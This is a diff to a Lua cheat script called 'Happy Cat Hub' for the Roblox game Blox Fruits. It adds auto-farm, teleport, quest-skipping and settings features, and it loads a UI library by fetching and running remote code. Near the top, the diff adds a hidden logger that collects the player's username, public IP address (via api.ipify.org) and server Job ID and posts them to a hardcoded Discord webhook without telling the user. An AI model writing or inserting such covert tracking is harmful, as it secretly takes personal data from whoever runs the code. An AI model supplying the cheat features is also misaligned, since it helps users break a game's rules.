@@ -1,15 +1,104 @@
-First_Sea = false
-Second_Sea = false
-Third_Sea = false
-local placeId = game.PlaceId
-if placeId == 2753915549 then
-First_Sea = true
-elseif placeId == 4442272183 then
-Second_Sea = true
-elseif placeId == 7449423635 then
-Third_Sea = true
+repeat
+    wait(4)
+until game:IsLoaded(4)
+if game.PlaceId == 2753915549 then
+    World1 = true
+elseif game.PlaceId == 4442272183 then
+    World2 = true
+elseif game.PlaceId == 7449423635 then
+    World3 = true
 end
-            function MaterialMon()
+game.StarterGui:SetCore("SendNotification", {
+    Icon = "rbxassetid://104450799419041",
+    Title = "Happy Cat Hub",
+    Text = "Loading!",
+    Duration = 2,
+})
+  
+------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------
+function PostWebhook(Url, message)
+    local request = http_request or request or HttpPost or syn.request
+    local data =
+        request(
+        {
+            Url = Url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(message)
+        }
+    )
+    return ""
+end
+
+function AdminLoggerMsg()
+    local randomColor = math.random(0, 0xFFFFFF)
+    local AdminMessage = {
+        ["embeds"] = {
+            {
+                ["title"] = "**Update 0.02 part1**",
+                ["description"] = "",
+                ["type"] = "rich",
+                ["color"] = randomColor,
+                ["fields"] = {
+                    {
+                        ["name"] = "**Username**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**IP Address**",
+                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**Job ID**",
+                        ["value"] = "```" .. game.JobId .. "```",
+                        ["inline"] = false
+                    }
+                }, 
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+            }
+        }
+    }
+    return AdminMessage
+end
+
+
+PostWebhook(
+    "https://discord.com/api/webhooks/128229419320066356/H_zjzIYdiMyQbDRwDKOTZkDuRp4v9IMTLJ8wyjUdwlED-tRX4QfAdmkTgy-ApRMSE_Aj",
+    AdminLoggerMsg()
+)
+print("Dell load")
+print(" Join Team ")
+repeat
+    local ChooseTeam = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("ChooseTeam", true)
+    local UIController = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("UIController", true)
+    if UIController and ChooseTeam then
+        if ChooseTeam.Visible then
+            for i, v in pairs(getgc()) do
+                if type(v) == "function" and getfenv(v).script == UIController then
+                    local constant = getconstants(v)
+                    pcall(function()
+                        if (constant[1] == "Pirates" or constant[1] == "Marines") and #constant == 1 then
+                            local teamToSelect = getgenv().Team or "Pirates"
+                            if constant[1] == teamToSelect then
+                                v(teamToSelect)
+                            end
+                        end
+                    end)
+                end
+            end
+        end
+    end
+    wait(1)
+until game.Players.LocalPlayer.Team
+
+repeat
+    wait()
+until game.Players.LocalPlayer.Character
+
+    function MaterialMon()
 			if _G.SelectMaterial == "Radioactive Material" then
 				MMon = "Factory Staff"
 				MPos = CFrame.new(-507.7895202636719, 72.99479675292969, -126.45632934570312)
@@ -1833,7 +1922,41 @@ spawn(function()
 end)
 ------------------------------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------------------------------
+print("esp") 
+local foldername = "Happy Cat Hub"
+local filename = foldername.."/Setting.json"
+function saveSettings()
+    local HttpService = game:GetService("HttpService")
+    local json = HttpService:JSONEncode(_G)
+    if true then
+        if isfolder(foldername) then
+            if isfile(filename) then
+                writefile(filename, json)
+            else
+                writefile(filename, json)
+            end
+        else
+            makefolder(foldername)
+        end
+    end
+end
+------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------
 
+function loadSettings()
+    local HttpService = game:GetService("HttpService")
+    if isfolder(foldername) then
+        if isfile(filename) then
+            _G = HttpService:JSONDecode(readfile(filename))
+        end
+    end
+end
+------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------
 
     function AutoHaki()
         if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("HasBuso") then
@@ -2334,6 +2457,9 @@ function StoreFruit()
 end
 
 
+
+
+
 local screenGui = Instance.new("ScreenGui")
 local textButton = Instance.new("TextButton")
 
@@ -2377,7 +2503,7 @@ end
 textButton.MouseButton1Click:Connect(function()
     StopTween()
 end)
-
+---UI
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local SoundService = game:GetService("SoundService")
 local TweenService = game:GetService("TweenService")
@@ -2450,50 +2576,11 @@ ImageButton.MouseButton1Click:Connect(function()
     game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.LeftControl, false, game)
 end)
 
-    HttpService = game:GetService("HttpService")
-    local i = "Happy Cat Hub"
-    local j = "-BloxFruit.json"
-    local l = game.Players.LocalPlayer.Name .. j
-    if Adel then
-        HttpService = game:GetService("HttpService")
-        local i = "Happy Cat Hub"
-        local j = "-BloxFruit.json"
-        local l = game.Players.LocalPlayer.Name .. j
-    end
-    function SaveSettings(m, n)
-        if m ~= nil then
-            h[m] = n
-        end
-        HttpService = game:GetService("HttpService")
-        if not isfolder(i) then
-            makefolder(i)
-        end
-        writefile(i .. "/" .. l, HttpService:JSONEncode(h))
-    end
-    function ReadSetting()
-        local s, o =
-            pcall(
-            function()
-                HttpService = game:GetService("HttpService")
-                if not isfolder(i) then
-                    makefolder(i)
-                end
-                return HttpService:JSONDecode(readfile(i .. "/" .. l))
-            end
-        )
-        if s then
-            return o
-        else
-            SaveSettings()
-            return ReadSetting()
-        end
-    end
-
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
 local Window = Fluent:CreateWindow({
-    Title = "Happy Cat hub | Blox Fruits",
+    Title = "Happy Cat hub|BF",
     SubTitle = " By Taidz",
     TabWidth = 100,
     Size = UDim2.fromOffset(530, 350),
@@ -2756,6 +2843,8 @@ end)
 })
 
 Dropdown:SetValue("Melee")
+
+Dropdown:OnChanged(function(Value)
     _G.SelectWeapon = Value
 end)
 
@@ -2848,6 +2937,7 @@ local spin = Tabs.Settings:AddToggle("spin", {
     saveSettings()
     end)
     
+
 
     Toggle = Tabs.Settings:AddToggle("MyToggle", {Title = "Remove Notification", Default = RemoveNotify })
     Toggle:OnChanged(function(Value)
@@ -3491,7 +3581,7 @@ end)
     
     local dealermirrafe = Tabs.cailon:AddToggle("dealermirrafe", {
     Title = "Teleport Advanced Fruit Dealer",
-    Description = "",
+    Description = "teleport to npc seller fruit in Mirage islands faster ez",
     Default = _G.Miragenpc })
     dealermirrafe:OnChanged(function(Value)
     _G.Miragenpc = Value
@@ -3510,7 +3600,7 @@ spawn(function()
 end)
 local miricheat = Tabs.cailon:AddToggle("miricheat", {
     Title = "Tween Chest on Mirage Island",
-    Description = "",
+    Description = "ez nothing for read",
     Default = _G.AutoChestMirage })
     miricheat:OnChanged(function(value)
     _G.AutoChestMirage = value
@@ -3539,10 +3629,10 @@ spawn(function()
 		end
 	end
 end)
-    
+    Tabs.stack:AddSection("Sea Quest")
     local Quetsi2 = Tabs.stack:AddToggle("Quetsi2", {
-    Title = "Auto Sea 2",
-    Description = "",
+    Title = "Auto Complex Quest Sea 2",
+    Description = "automatically do all tasks to be able to go to the new world",
     Default = _G.AutoSecondSea })
     Quetsi2:OnChanged(function(Value)
     _G.AutoSecondSea = Value
@@ -3604,8 +3694,8 @@ end)
         end)
     end
     local Quetsi3 = Tabs.stack:AddToggle("Quetsi3", {
-    Title = "Auto Sea 3",
-    Description = "",
+    Title = "Auto Complex Quest Sea 3",
+    Description = "automatically do all tasks to be able to go to the third world",
     Default = _G.AutoThirdSea })
     Quetsi3:OnChanged(function(Value)
     _G.AutoThirdSea = Value
@@ -3653,10 +3743,10 @@ end)
             end
         end)
     end
-    
+    Tabs.Main:AddSection("Farm Mastery")
     local matfruit = Tabs.Main:AddToggle("matfruit", {
     Title = "Farm Mastery Fruit",
-    Description = "",
+    Description = "automatically farm fruit mastery but error bring mob",
     Default = _G.AutoFarmFruitMastery })
     matfruit:OnChanged(function(Value)
     _G.AutoFarmFruitMastery = Value
@@ -3841,7 +3931,7 @@ end)
     end)
     local matgun = Tabs.Main:AddToggle("matgun", {
     Title = "Farm Mastery Gun",
-    Description = "",
+    Description = "automatically farm gun mastery ez",
     Default = _G.AutoFarmGunMastery })
     matgun:OnChanged(function(Value)
     _G.AutoFarmGunMastery = Value
@@ -4060,9 +4150,9 @@ function BringMobBone(name, CFrameMon)
     
     local DropdownTweenSpeed = Tabs.Main:AddDropdown("DropdownTweenSpeed", {
     Title = "Speed Tween",
-    Values = {"350", "400", "450", "500", "700","10000"},
+    Values = {"300", "340", "350", "500", "700"},
     Multi = false,
-    Default = 450,
+    Default = 340,
 })
 DropdownTweenSpeed:SetValue("TweenSpeed")
 DropdownTweenSpeed:OnChanged(function(Value)
@@ -4086,7 +4176,7 @@ end)
     
 local farmbun = Tabs.Main:AddToggle("farmbun", {
     Title = "Auto Farm Bone",
-    Description = "",
+    Description = "sea 3 func, bypass tp to island and farm",
     Default = _G.Auto_Bone })
     farmbun:OnChanged(function(value)
     _G.Auto_Bone = value
@@ -9892,10 +9982,9 @@ spawn(function()
     end)
 end)
 
-
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 game.StarterGui:SetCore("SendNotification", {
-Title = "!",
+Title = "HappyCathub",
 Text = "Successfully",
 Duration = 5,
 })
